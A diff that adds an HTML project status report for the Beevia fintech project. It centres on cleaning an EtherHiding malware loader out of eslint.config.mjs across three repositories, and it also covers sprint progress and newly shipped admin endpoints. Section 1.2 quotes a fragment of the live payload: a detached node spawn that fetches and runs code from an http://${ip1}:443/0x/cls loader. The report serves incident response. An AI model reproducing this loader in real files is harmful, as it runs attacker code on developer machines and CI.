@@ -1,0 +1,627 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Beevia — Project Status — 8 Sep 2026</title>
+<meta name="description" content="The malware was cleaned off main in all three repositories, verified by blob hash across every ref — but eight beevia-admin-api branches still carry it, and one of them is the only copy of an entire unreported module. Both of this week's good architectural calls were made silently and found by reading code.">
+<meta name="color-scheme" content="dark">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<!--
+  DIRECTION CONTRACT · seed 6c4a0ed0 (carried forward unchanged)
+  THESIS: A status report whose subject is the disagreement between its sources.
+  STORY: Today the disagreement is between "clean" and "clean". main was
+  rebuilt and verifies perfectly; the repository around it did not. And twice
+  in one week the team made the right architectural call — on-device
+  translation, metadata-only moderation — without recording it anywhere, so
+  this pipeline had to find both by reading code, having previously written
+  down the opposite of each.
+-->
+
+<div class="topbar">
+    <div class="topbar__mark">
+      <span class="barcode" aria-hidden="true"></span>
+      <span class="topbar__wordmark">Beevia</span>
+    </div>
+    <nav class="topbar__nav label" aria-label="Report">
+      <a href="index.html">Archive</a>
+      <a href="#s1"><span>Security</span></a>
+      <a href="#overview">Overview</a>
+      <a href="#s2"><span>Corrections</span></a>
+      <a href="#method">Method</a>
+    </nav>
+</div>
+
+<header class="masthead">
+  <div class="field">
+    <div class="field__rail field__rail--l">
+      <dl>
+        <dt>Repos compromised on <code>main</code></dt>
+        <dd>0 of 5 &middot; was 3</dd>
+        <dt>Branches still infected</dt>
+        <dd>8</dd>
+        <dt>Sprint 0901</dt>
+        <dd>day 6 of 19</dd>
+        <dt>Days since a submission</dt>
+        <dd>11</dd>
+      </dl>
+    </div>
+
+    <div class="field__stage">
+      <div class="field__title">
+        <h1>Project<br>Status</h1>
+      </div>
+      <div class="field__meta num">
+        <span>2026-09-08</span>
+        <span>0901 open &middot; 08-01 closed</span>
+        <span>3&ndash;22 Sep</span>
+        <span>Remediated, not finished</span>
+      </div>
+    </div>
+
+    <div class="field__rail field__rail--r">
+      <dl>
+        <dt>API surface</dt>
+        <dd>131 / 37 &middot; +2 admin</dd>
+        <dt>Dashboard modules live</dt>
+        <dd>6 of 10 &middot; was 5</dd>
+        <dt>0901 started</dt>
+        <dd>4 of 17 leaves</dd>
+        <dt>Estimated</dt>
+        <dd>0 / 25</dd>
+      </dl>
+    </div>
+  </div>
+</header>
+
+<section class="mvp" aria-label="MVP readiness estimate">
+  <div class="mvp__head">
+    <span class="label">MVP readiness &mdash; estimate</span>
+    <span class="mvp__pct num">&asymp;56%</span>
+    <span class="mvp__meta num">target 2026-09-01 &middot; provisional &middot; 7 days past</span>
+  </div>
+  <div class="mvp__bar" role="img" aria-label="Weighted capability bar: roughly 56 percent built. Admin oversight rises to 0.78 as the wallets endpoints ship and the dashboard module goes live. International KYC, cross-currency FX and consent management are not started.">
+    <span class="mvp__seg" style="flex:15" title="E2EE messaging — 0.9"><i style="width:90%"></i></span>
+    <span class="mvp__seg" style="flex:8" title="Voice &amp; video calling — 0.8"><i style="width:80%"></i></span>
+    <span class="mvp__seg" style="flex:7" title="Message translation — 0.15"><i style="width:15%"></i></span>
+    <span class="mvp__seg" style="flex:8" title="Local KYC tier (BVN) — 0.9"><i style="width:90%"></i></span>
+    <span class="mvp__seg" style="flex:6" title="International KYC tier — 0"></span>
+    <span class="mvp__seg" style="flex:12" title="Multi-currency wallets — 0.70"><i style="width:70%"></i></span>
+    <span class="mvp__seg" style="flex:12" title="Send / request / receive — 0.80"><i style="width:80%"></i></span>
+    <span class="mvp__seg" style="flex:12" title="Cross-currency FX — 0"></span>
+    <span class="mvp__seg" style="flex:10" title="Virtual cards — 0.55"><i style="width:55%"></i></span>
+    <span class="mvp__seg" style="flex:4" title="Consent management — 0"></span>
+    <span class="mvp__seg" style="flex:6" title="Admin oversight — 0.78 (was 0.72)"><i style="width:78%"></i></span>
+  </div>
+  <p class="mvp__read"><strong>The target date passed seven days ago; the product is roughly 56% built.</strong> One capability moves &mdash; admin oversight 0.72 &rarr; 0.78, with both halves moving in the same 48 hours: the admin API goes 35 &rarr; 37 with the Wallets endpoints, and <code>beevia-admin</code>'s dashboard module stops being a mock. <strong>Message translation does not move</strong>, despite this edition's largest new piece of information &mdash; knowing the right architecture is not the same as having built it, and a rubric that scored plans would stop meaning anything. Three capabilities carrying 22 weighted points remain unstarted. Segment width = weight &middot; fill = build evidence, <em>not</em> board status. <a href="#mvp-method">Method and capability table</a>.</p>
+</section>
+
+<div class="shell">
+  <nav class="contents label" aria-label="Contents">
+    Contents
+    <ol>
+      <li><a href="#s1"><span>01</span> Security &mdash; remediation</a></li>
+      <li><a href="#overview"><span>00</span> Quick overview</a></li>
+      <li><a href="#s2"><span>02</span> Corrections</a></li>
+      <li><a href="#s3"><span>03</span> Sprint 0901</a></li>
+      <li><a href="#s4"><span>04</span> What shipped</a></li>
+      <li><a href="#s5"><span>05</span> Spec updates</a></li>
+      <li><a href="#s6"><span>06</span> Admin dashboard board</a></li>
+      <li><a href="#s7"><span>07</span> Team detail</a></li>
+      <li><a href="#s8"><span>08</span> Risks &amp; recommendations</a></li>
+      <li><a href="#s9"><span>09</span> What I would do</a></li>
+      <li><a href="#method"><span>&mdash;</span> Method</a></li>
+    </ol>
+  </nav>
+
+  <main class="doc">
+
+    <section class="sec" id="s1">
+      <div class="sec__h"><span class="sec__n">01</span><h2>Security &mdash; remediation status</h2></div>
+
+      <p>Yesterday's edition reported that <code>origin/main</code> of <code>beevia-api</code>, <code>beevia-admin-api</code> and <code>beevia-db-schema</code> had been force-pushed with an EtherHiding malware loader appended to <code>eslint.config.mjs</code>, and that at least one developer workstation was infected because the payload rode in on legitimate work.</p>
+
+      <p><strong>All three branches were rebuilt this morning.</strong> The commit metadata records it precisely: the three surviving <code>beevia-admin-api</code> commits carry author dates of 6 September and <strong>committer dates of 8 September 13:36&ndash;13:45 UTC</strong>, by <code>phoenixdahdev &lt;ayomikuntemitope.araoye@gmail.com&gt;</code>. Three <code>rescue/*</code> branches were pushed alongside, which is the shape of someone taking snapshots before rewriting. This was a deliberate, careful recovery, not an accident.</p>
+
+      <h3>1.1 What is verified clean</h3>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Check</th><th scope="col">Result</th></tr></thead>
+          <tbody>
+            <tr><th scope="row"><code>eslint.config.mjs</code> blob on <code>origin/main</code>, all three repos</th><td class="hi"><code>09fc5b23&hellip;</code>, <strong>1485 bytes</strong> &mdash; byte-identical to the last-known-good blob still held in this workspace</td></tr>
+            <tr><th scope="row">Same file on local <code>main</code> (the pre-compromise tip)</th><td><code>09fc5b23&hellip;</code> &mdash; <strong>the same object</strong>, so the clean file is provably the original, not a retyped approximation</td></tr>
+            <tr><th scope="row">Every <code>eslint.config.mjs</code> blob reachable from <code>origin/main</code> history, all five repos</th><td>Only <code>09fc5b23&hellip;</code> (1485 B) and its older <code>4e9f8271&hellip;</code> (899 B) predecessor. <strong>The 9167-byte payload appears nowhere</strong></td></tr>
+            <tr><th scope="row"><code>.gitignore</code> markers (<code>branch_structure.json</code>, <code>temp_auto_push.bat</code>, <code>temp_interactive_push.bat</code>)</th><td><strong>Gone</strong> from all three</td></tr>
+            <tr><th scope="row">Tree of <code>origin/main</code> vs the last-known-good local tip (<code>beevia-api</code>, <code>beevia-db-schema</code>)</th><td><strong>Identical.</strong> Nothing but the payload was removed, and nothing else was changed</td></tr>
+            <tr><th scope="row"><code>beevia-api</code>, <code>beevia-db-schema</code> remote branches</th><td>Only <code>main</code> remains &mdash; the feature branches were deleted</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The verification was done by comparing <strong>object hashes across every ref</strong>, not by reading diffs. That matters: the payload was appended after a long run of tab characters and is invisible in a diff view, which is how it survived review in the first place.</p>
+
+      <h3>1.2 What is not clean &mdash; eight branches in <code>beevia-admin-api</code></h3>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Branch</th><th scope="col"><code>eslint.config.mjs</code></th><th scope="col">Last commit</th></tr></thead>
+          <tbody>
+            <tr><th scope="row"><code>feat/admin-chats</code></th><td class="hi">&#9940; <code>d394c08e&hellip;</code> <strong>9167 B</strong></td><td class="hi">2026-09-07 &mdash; <strong><code>copilot-swe-agent[bot]</code> merged <code>origin/main</code> into it</strong></td></tr>
+            <tr><th scope="row"><code>feat/admin-dashboard</code></th><td>&#9940; 9167 B</td><td>2026-09-06</td></tr>
+            <tr><th scope="row"><code>feat/admin-wallets</code></th><td>&#9940; 9167 B</td><td>2026-09-06</td></tr>
+            <tr><th scope="row"><code>feat/admin-user-transactions</code></th><td>&#9940; 9167 B</td><td>2026-09-04</td></tr>
+            <tr><th scope="row"><code>feat/ledger-anchor-reconciliation</code></th><td>&#9940; 9167 B</td><td>2026-09-04</td></tr>
+            <tr><th scope="row"><code>feat/reconciliation-aggregate</code></th><td>&#9940; 9167 B</td><td>2026-09-04</td></tr>
+            <tr><th scope="row"><code>BVA-1226</code></th><td>&#9940; 9167 B</td><td>2026-09-04</td></tr>
+            <tr><th scope="row"><code>rescue/3b188c9</code></th><td>&#9940; 9167 B</td><td>2026-09-06</td></tr>
+            <tr><th scope="row"><code>rescue/43abc3a</code>, <code>rescue/e6b8436</code></th><td>&#9989; 1485 B</td><td>clean snapshots</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Spot-checked content: the blob still ends in <code>spawn("node",["-e",env+code],{detached:!0,stdio:"ignore",windowsHide:!0}).unref()</code> with the same <code>http://${ip1}:443/0x/cls</code> loader. It is the same payload, unmodified.</p>
+
+      <ol>
+        <li><strong>CI is not safe yet.</strong> A push to, or a pull request from, any of these branches runs a lint job that loads the malicious config. Freezing CI on <code>beevia-admin-api</code> alone is not enough if the freeze was lifted after <code>main</code> was fixed.</li>
+        <li><strong>One merge re-infects <code>main</code>.</strong> Three of them are live feature branches. Merging any without rebasing onto the clean history puts the file straight back where it was yesterday.</li>
+        <li><strong>An automated agent is operating on an infected branch.</strong> <code>copilot-swe-agent[bot]</code> merged <code>origin/main</code> into <code>feat/admin-chats</code> yesterday. Whatever environment that agent runs in checked out a tree containing the payload &mdash; and that is also the one branch of the eight that cannot simply be deleted (&sect;4.4).</li>
+      </ol>
+
+      <h3>1.3 The remedy: seven deletions and one rebase</h3>
+      <p>Note first that <em>none</em> of the eight is an ancestor of the rebuilt <code>main</code> &mdash; the rewrite gave every commit a new SHA, so <code>git branch --merged</code> reports all eight as unmerged and is the wrong instrument here. Compare content instead:</p>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Branch</th><th scope="col">Unique content vs <code>main</code></th><th scope="col">Action</th></tr></thead>
+          <tbody>
+            <tr><th scope="row"><code>BVA-1226</code>, <code>feat/admin-user-transactions</code>, <code>feat/ledger-anchor-reconciliation</code>, <code>feat/reconciliation-aggregate</code></th><td><strong>None.</strong> All four point at the same old poisoned merge <code>d83687c</code> and are <em>behind</em> <code>main</code> by 13 files</td><td><strong>Delete</strong></td></tr>
+            <tr><th scope="row"><code>feat/admin-wallets</code>, <code>feat/admin-dashboard</code></th><td><strong>None.</strong> Content-identical to <code>main</code> except <code>eslint.config.mjs</code> and <code>.gitignore</code> &mdash; i.e. the payload and its cover</td><td><strong>Delete</strong></td></tr>
+            <tr><th scope="row"><code>rescue/3b188c9</code></th><td>None; a pre-rewrite snapshot, behind <code>main</code></td><td><strong>Delete</strong> once &sect;1.1 is accepted</td></tr>
+            <tr><th scope="row" class="hi"><code>feat/admin-chats</code></th><td class="hi"><strong>Yes &mdash; an entire unmerged module</strong> (&sect;4.4)</td><td class="hi"><strong>Rebase onto <code>origin/main</code>.</strong> Do not delete</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>1.4 What cannot be verified from here</h3>
+      <div class="note">
+        <p><strong>The workstation.</strong> Yesterday's finding was that the infection is on a developer machine, because the payload arrived inside genuine application work. Nothing observable from here says that has been dealt with. If it has not been imaged and cleaned, the next legitimate commit re-introduces the file and this section repeats itself.</p>
+        <p><strong>Credential rotation.</strong> Invisible from a git clone. It is recorded as done or not done nowhere &mdash; and it is the step that decays fastest with delay.</p>
+        <p style="margin-bottom:0"><strong>Branch protection.</strong> The GitHub credential available in this environment has <strong>no access to the <code>Drumbell-Technologies</code> organisation</strong> &mdash; <code>repos/Drumbell-Technologies/beevia-api</code> returns <code>404</code> for the repository itself, not just for its protection settings, so &ldquo;not found&rdquo; carries no information either way. This is not a finding that the control is missing; it is a finding that <strong>this report has no instrument for the control it keeps recommending</strong>.</p>
+      </div>
+
+      <h3>1.5 What this refresh did and did not do</h3>
+      <p>The three repositories are <strong>still not synced</strong>, and deliberately so. <code>sync_repos.py</code> is limited to <code>--ff-only</code> merges; <code>origin/main</code> is a rewritten history, so the merge is correctly refused. Resolving it needs <code>git reset --hard origin/main</code> or equivalent, which is outside this pipeline's sanctioned exception and is a decision for whoever owns those clones.</p>
+      <p><strong>The evidence now says it is safe to do.</strong> <code>origin/main</code> is verifiably clean (&sect;1.1) and its trees for <code>beevia-api</code> and <code>beevia-db-schema</code> are byte-identical to the local tips, so adopting it discards nothing. But the local clones hold the last-known-good pre-rewrite tips (<code>d9af17b</code>, <code>43abc3a</code>, <code>5b0592a</code>), which have been useful twice this week &mdash; <strong>capture those SHAs before resetting</strong>, they are the only offline copy of the pre-incident history.</p>
+      <p>Nothing was executed from any sub-repo. No <code>npm</code>, <code>node</code>, <code>eslint</code> or build step ran. All code claims about the three unsynced repositories were made against <code>origin/main</code> read through <code>git show</code> and <code>git archive</code> into a temp directory outside the workspace.</p>
+    </section>
+
+    <section class="sec" id="overview">
+      <div class="sec__h"><span class="sec__n">00</span><h2>Quick overview</h2></div>
+
+      <div class="invert" style="margin-bottom:var(--s-6)">
+        <p class="lede">The compromise has been remediated on <code>main</code>, and it was done properly &mdash; all three repositories now carry a byte-identical clean <code>eslint.config.mjs</code>, and a full history sweep finds the payload nowhere on <code>origin/main</code> in any of the five repos. <strong>It is not finished.</strong> Eight <code>beevia-admin-api</code> feature branches still carry the malware, one of them touched by an automated Copilot agent yesterday, and merging any of them puts it straight back on the branch that was just cleaned. Separately, two of this pipeline's standing claims turned out to be wrong: sprint 0901 is not blocked on a translation provider, and David has not stopped working.</p>
+      </div>
+
+      <div class="tbl-wrap">
+        <table>
+          <caption class="label" style="text-align:left;padding:var(--s-3);border-bottom:var(--hair)">Movement, 7 Sep &rarr; 8 Sep</caption>
+          <thead>
+            <tr><th scope="col">Measure</th><th scope="col" class="r">7 Sep</th><th scope="col" class="r">8 Sep</th><th scope="col" class="r">&Delta;</th></tr>
+          </thead>
+          <tbody>
+            <tr><th scope="row">Repos with a compromised <code>origin/main</code></th><td class="r hi">3</td><td class="r hi">0</td><td class="r hi">&minus;3</td></tr>
+            <tr><th scope="row"><code>beevia-admin-api</code> branches still carrying the payload</th><td class="r">not measured</td><td class="r hi">8</td><td class="r hi">new</td></tr>
+            <tr><th scope="row">Sprint 0901 leaves in To do</th><td class="r">14</td><td class="r">13</td><td class="r">&minus;1</td></tr>
+            <tr><th scope="row">Sprint 0901 leaves In progress</th><td class="r">3</td><td class="r hi">4</td><td class="r hi">+1</td></tr>
+            <tr><th scope="row">Sprint 0901 board transitions (window)</th><td class="r">11</td><td class="r">2</td><td class="r">&minus;9</td></tr>
+            <tr><th scope="row">Days since anything entered REVIEW/QA</th><td class="r">10</td><td class="r hi">11</td><td class="r hi">+1</td></tr>
+            <tr><th scope="row">Estimation points set (0901)</th><td class="r hi">0 / 25</td><td class="r hi">0 / 25</td><td class="r">0</td></tr>
+            <tr><th scope="row">Sprint 08-01 (closed)</th><td class="r">41 leaves, all Done</td><td class="r">unchanged</td><td class="r">0</td></tr>
+            <tr><th scope="row">API surface (consumer / admin)</th><td class="r">131 / 35</td><td class="r hi">131 / 37</td><td class="r hi">0 / +2</td></tr>
+            <tr><th scope="row">Admin spec modules with something built</th><td class="r">5 of 8</td><td class="r">5 of 8</td><td class="r">0</td></tr>
+            <tr><th scope="row"><code>beevia-admin</code> modules on the live API</th><td class="r">5 of 10</td><td class="r hi">6 of 10</td><td class="r hi">+1</td></tr>
+            <tr><th scope="row"><code>beevia-admin</code> modules still mock-only</th><td class="r">2</td><td class="r">2</td><td class="r">0</td></tr>
+            <tr><th scope="row">MVP readiness (estimate)</th><td class="r">&asymp;56%</td><td class="r hi">&asymp;56%</td><td class="r">+0.4 pt</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <caption class="label" style="text-align:left;padding:var(--s-3);border-bottom:var(--hair)">Team at a glance</caption>
+          <thead><tr><th scope="col">Person</th><th scope="col">Owns</th><th scope="col" class="r">0901 leaves</th><th scope="col" class="r">Subs (7d)</th><th scope="col" class="r">Median cycle</th><th scope="col">Open WIP</th><th scope="col" class="r">Commits (7d)</th><th scope="col">Flag</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">Ayomikun Araoye</th><td>backend + admin API</td><td class="r hi">9, all To do</td><td class="r">4</td><td class="r">3.0 d</td><td>&mdash;</td><td class="r">20</td><td>Rebuilt the three poisoned branches this morning (&sect;1). Nine 0901 leaves untouched for a 5th day</td></tr>
+            <tr><th scope="row">David Samuel</th><td>mobile</td><td class="r">6 &mdash; 3 In progress</td><td class="r">3</td><td class="r">2.6 d</td><td>3; ages 3.9 d &times;2, 0.1 d</td><td class="r hi">0 to <code>main</code>, 3 on <code>BVA-I192</code></td><td>Started two items himself today. <code>beevia-mobile</code> <code>main</code> untouched <strong>13 days</strong>; <code>BVA-I192</code> now <strong>14 commits</strong> unmerged under a Done item</td></tr>
+            <tr><th scope="row">Philip Chidera</th><td>design</td><td class="r">2 &mdash; 1 In progress</td><td class="r">2</td><td class="r">0.9 d</td><td class="hi">1, age 3.9 d</td><td class="r">&mdash;</td><td>WIP is 4&times; his own median. No board action since Friday</td></tr>
+            <tr><th scope="row">Promise Udo</th><td>admin dashboard</td><td class="r hi">0</td><td class="r">&mdash;</td><td class="r">&mdash;</td><td>&mdash;</td><td class="r hi">5</td><td>Wired the dashboard module to <code>GET /admin/dashboard</code> and deleted its last mock files. 19th edition with no board row</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p style="font-size:0.9em">Flow figures (submissions, median cycle) are unchanged since 3 September &mdash; <strong>nothing has entered REVIEW/QA on either board for eleven days</strong>, so there is no new throughput to measure. Commit counts are trailing-7-day, merged to the default branch except where stated, summing each person's git identities.</p>
+
+      <div class="note">
+        <span class="label">The two questions for standup</span>
+        <p><strong>Can the eight infected <code>beevia-admin-api</code> branches be deleted, or does someone need them?</strong> Seven carry no unique work and are pure liability; the eighth is the only copy of a whole module and needs a rebase (&sect;1.3).</p>
+        <p style="margin-bottom:0"><strong>Is <code>BVA-I192</code> waiting on review, or on a decision?</strong> Fourteen commits, two of them yesterday, under a board item that has been Done for eleven days.</p>
+      </div>
+
+      <h3>The three things worth knowing</h3>
+
+      <div class="stack">
+        <div class="finding">
+          <div class="finding__n num">1</div>
+          <div>
+            <p><strong>The cleanup worked, and it is half-finished.</strong> <code>main</code> is clean on all three repositories &mdash; verified by blob hash across the full history of every default ref, not by reading a diff. But <code>beevia-admin-api</code> has eight other remote branches with the payload intact, <code>feat/admin-chats</code> among them, which a <strong>Copilot agent merged <code>origin/main</code> into yesterday</strong>. The exposure did not end when <code>main</code> was fixed (&sect;1.2, &sect;1.3).</p>
+          </div>
+        </div>
+        <div class="finding">
+          <div class="finding__n num">2</div>
+          <div>
+            <p><strong>Sprint 0901 is not blocked on a translation provider, and this pipeline said it was.</strong> <code>BVA-I228</code>'s acceptance criteria put translation <strong>on-device</strong> &mdash; iOS Translation framework and Android ML Kit &mdash; explicitly so message content never leaves the phone. That is the correct architecture for an E2EE product, it makes the server-side stub irrelevant to chat, and <code>api-rfc.md</code> &sect;5.5 had concluded the exact opposite five days ago (&sect;2.1).</p>
+          </div>
+        </div>
+        <div class="finding">
+          <div class="finding__n num">3</div>
+          <div>
+            <p><strong>Module 4 has been built, correctly, and nobody has said so.</strong> <code>admin-api-rfc.md</code> &sect;5.1 has argued since 5 August that Trust &amp; Safety cannot be built as specified &mdash; the spec wants &ldquo;reported messages&rdquo; and chat is E2EE &mdash; and it recommended metadata-only moderation as the honest alternative. An unmerged branch contains exactly that: four <code>/admin/chats</code> endpoints whose controller docstring reads <em>&ldquo;serves metadata + moderation only &mdash; never message content&rdquo;</em>, including the first reader the <code>conversation_reports</code> table has ever had. It sits on <code>feat/admin-chats</code>, one of the eight infected branches, which is why it must be rebased rather than deleted (&sect;4.4). Separately, <code>GET /admin/wallets</code> and its per-user drill-down shipped Saturday, taking Module 5 to six of seven operations (&sect;4.1).</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="invert">
+        <span class="label" style="display:block;margin-bottom:var(--s-3)">If you read nothing else</span>
+        <p style="margin-bottom:0;font-variation-settings:'wdth' 75,'wght' 500;max-width:64ch">Delete seven of the eight infected branches and rebase the eighth today, because one merge undoes this morning's cleanup and that eighth branch is the only copy of an entire module; sprint 0901 has moved 4 of 17 leaves in 6 days with zero estimates and zero submissions; and both of this week's genuinely good architectural calls &mdash; on-device translation and metadata-only moderation &mdash; were made silently and found by reading code, which is a reporting problem rather than an engineering one.</p>
+      </div>
+    </section>
+
+    <section class="sec" id="s2">
+      <div class="sec__h"><span class="sec__n">02</span><h2>Corrections</h2></div>
+
+      <h3>2.1 <code>api-rfc.md</code> &sect;5.5 was wrong about the translation sprint</h3>
+      <p><strong>Claim (2026-09-03, restated 2026-09-04 and 2026-09-07): &ldquo;connecting a real provider is a prerequisite for the translation sprint, and it is not on the board.&rdquo;</strong></p>
+      <p>It is not a prerequisite, and the answer was on the board the whole time. Sprint 0901's foundation story <code>BVA-I228</code> &mdash; <em>On-Device Translation Engine Integration</em> &mdash; states its own design in its acceptance criteria:</p>
+      <div class="note">
+        <p style="margin-bottom:0"><em>&ldquo;a working on-device translation capability, so chat messages can be translated without any message content leaving the user's phone&rdquo;</em> &mdash; integrating <strong>iOS's native Translation framework and Android's ML Kit Translation behind one unified internal translation service</strong>, for English (UK), English (US), French, Spanish and Mandarin, handling the on-device model download and offline fallback.</p>
+      </div>
+      <p>Server-side translation of chat requires plaintext at the server. That is exactly what E2EE forbids, and it is the same constraint that makes the admin console's content-moderation module unbuildable (<code>admin-api-rfc.md</code> &sect;5.1). <strong>The team chose the architecture that preserves the product's central privacy claim, and this pipeline spent three editions calling it blocked on the architecture that would have broken it.</strong></p>
+      <p>The failure mode is worth naming, because it is not the same one as last time. This was not inferring build state from board state; it was <strong>reading the board's status column and not its descriptions</strong>. <code>BVA-I228</code>'s title alone contained the correction. <code>api-rfc.md</code> gains &sect;5.5a with the full version, and the two now-probably-obsolete proposed operations are annotated rather than deleted (&sect;5.3).</p>
+
+      <h3>2.2 The audit's admin drift line is an artifact, again, and it grew</h3>
+      <p>Today's audit closes with <code>beevia-admin-api code=34 spec=37 &mdash; documented, not in code: GET /admin/dashboard, GET /admin/wallets, GET /admin/wallets/users/{}</code>. <strong>None of that is drift.</strong> All three exist on <code>origin/main</code>; they are absent from the <em>working tree</em> because the fast-forward is still refused (&sect;1.5). Running the same extractor against <code>origin/main</code> gives <strong>code=37, spec=37, zero difference in either direction</strong> &mdash; and <code>beevia-api</code> likewise, 131 = 131.</p>
+      <p>Flagged for the second consecutive edition so that nobody &ldquo;fixes&rdquo; the spec by deleting three real operations.</p>
+    </section>
+
+    <section class="sec" id="s3">
+      <div class="sec__h"><span class="sec__n">03</span><h2>Sprint 0901 &mdash; the active sprint</h2></div>
+
+      <h3>3.1 State</h3>
+      <p>25 items &mdash; <strong>17 leaves, 8 parent Stories</strong>. Sprint 3 Sep &rarr; 22 Sep, day 6 of 20.</p>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th scope="col">Owner</th><th scope="col" class="r">Leaves</th><th scope="col" class="r">To do</th><th scope="col" class="r">In progress</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">Ayomikun Araoye</th><td class="r">9</td><td class="r hi">9</td><td class="r">0</td></tr>
+            <tr><th scope="row">David Samuel</th><td class="r">6</td><td class="r">3</td><td class="r">3</td></tr>
+            <tr><th scope="row">Philip Chidera</th><td class="r">2</td><td class="r">1</td><td class="r">1</td></tr>
+            <tr><th scope="row" class="hi">Total</th><td class="r hi">17</td><td class="r hi">13</td><td class="r hi">4</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>REVIEW/QA: 0. Done: 0.</p>
+
+      <h3>3.2 The window's movement, and who made it</h3>
+      <p>Two transitions, both today at <strong>12:16 UTC</strong>, both by <strong>David Samuel</strong>: <code>BVA-I242</code> <em>Static App UI Text Localization</em> and its leaf <code>BVA-I243</code> <em>String Extraction &amp; Bundle Switching</em>, To do &rarr; In progress.</p>
+      <p>Small, but it is the first time in this sprint that <strong>David started his own items</strong>. Every previous start was made by Philip, including three on items David owns. Board hygiene performed by one person on another's behalf is not the same signal as an owner picking up work, and this is the better one.</p>
+      <p>Against that: <strong>Ayomikun has not touched any of his nine leaves for a fifth consecutive day</strong>, and all nine are the sprint's backend half. He has been shipping continuously (&sect;4), just not on this sprint.</p>
+
+      <h3>3.3 What the sprint actually is</h3>
+      <p>Worth stating plainly, because three editions have discussed &ldquo;the translation sprint&rdquo; without reading it. 0901 is <strong>two workstreams</strong>:</p>
+      <div class="tbl-wrap scrolls">
+        <table class="wide">
+          <thead><tr><th scope="col">Workstream</th><th scope="col" class="r">Leaves</th><th scope="col">Owner</th></tr></thead>
+          <tbody>
+            <tr><th scope="row"><strong>Translation</strong> &mdash; on-device engine, language preference storage, per-conversation override, per-message toggle, app-text localization, backend string bundles</th><td class="r">10</td><td>David (client), Philip (design), Ayomikun (2 backend)</td></tr>
+            <tr><th scope="row"><strong>Push notifications</strong> &mdash; Firebase Admin SDK, device-token storage, payload routing, four trigger families, per-category preferences</th><td class="r">7</td><td class="hi">Ayomikun, all untouched</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The notification half is entirely Ayomikun's and entirely untouched. <code>BVA-I246</code> is the foundation (server-side FCM credential and device-token registration) and everything else in that half depends on it.</p>
+
+      <h3>3.4 Still no estimates &mdash; fifth consecutive edition</h3>
+      <p><strong>0 of 25 items carry estimation points</strong>, and none carries a tag. Velocity, burn-down and any workload comparison between people remain underivable. This report has now asked five times; either answer &mdash; &ldquo;here are the points&rdquo; or &ldquo;this project does not estimate&rdquo; &mdash; closes it.</p>
+    </section>
+
+    <section class="sec" id="s4">
+      <div class="sec__h"><span class="sec__n">04</span><h2>What shipped this cycle</h2></div>
+
+      <h3>4.1 <code>beevia-admin-api</code> &mdash; the Wallets screen (2 operations)</h3>
+      <p>Merged 6 September, first seen by this pipeline today because the branch was unsyncable yesterday.</p>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th scope="col">Method</th><th scope="col">Path</th><th scope="col">Permission</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">GET</th><td><code>/admin/wallets</code></td><td><code>wallets:view</code></td></tr>
+            <tr><th scope="row">GET</th><td><code>/admin/wallets/users/{userId}</code></td><td><code>wallets:view</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>A platform-wide summary (total held per currency, counts by status) over a filterable, paginated list of customer wallets &mdash; user, currency, balance, status, provider and pay-in virtual account &mdash; plus a per-user drill-down. <code>search</code> matches the owner by name, username, email or phone; ordering is balance descending. System and escrow wallets are excluded via <code>wallet_type = 'user'</code>, so the totals are customer liability rather than the platform's balance sheet.</p>
+      <p><strong>It is well-built.</strong> Guards and permissions are present, the query is Zod-validated, the summary is four parallel aggregates rather than a scan, <code>wallets</code> was already in <code>adminModuleEnum</code> so no migration was needed, and it is the first admin operation to arrive with a <code>.spec.ts</code> beside it in the same commit.</p>
+      <div class="note">
+        <span class="label">Four contract facts for whoever builds the screen</span>
+        <p><strong>The summary ignores the filters.</strong> <code>total_wallets</code>, <code>by_currency</code> and <code>by_status</code> are computed over every user wallet regardless of <code>currency</code>, <code>status</code> or <code>search</code>. Deliberate &mdash; a &ldquo;total held&rdquo; tile should not move as the operator pages &mdash; but it is the single most likely thing to be read as a bug when it sits above a filtered table.</p>
+        <p><strong><code>by_status</code> is sparse.</strong> A status with no wallets is absent, not zero.</p>
+        <p><strong><code>search</code> matches the owner, not the wallet.</strong> There is no lookup by wallet id or by account number, which is where a support call actually starts (&ldquo;a transfer went to 9901234567&rdquo;).</p>
+        <p style="margin-bottom:0"><strong>Balances are presentation values</strong>, rounded from the ledger's scale-8 figure. Summing the column will not reproduce <code>total_balance</code>.</p>
+      </div>
+      <p><strong>What did not ship is the reason the proposal existed.</strong> The retired <code>GET /admin/users/{id}/wallets</code> proposal asked for the <strong>partner-reported balance beside the ledger balance with an <code>in_sync</code> flag</strong>, so a per-wallet mismatch was visible at a glance. The shipped row carries the ledger balance only. Answering &ldquo;is this one wallet in sync&rdquo; still means leaving the Wallets screen for <code>GET /admin/reconciliation/users/{userId}</code>, which runs an unbounded full-history comparison for the whole account.</p>
+      <p>One cosmetic artifact of the rebuild: <strong>the tip of <code>beevia-admin-api</code> <code>main</code> is an empty commit.</strong> <code>4981c70</code> and <code>ec32008</code> share a message and an author date; <code>ec32008</code> carries all 8 files, <code>4981c70</code> carries none. Harmless, and worth knowing before someone reads the tip as the wallets change.</p>
+
+      <h3>4.2 <code>beevia-admin</code> &mdash; the dashboard stopped being a mock</h3>
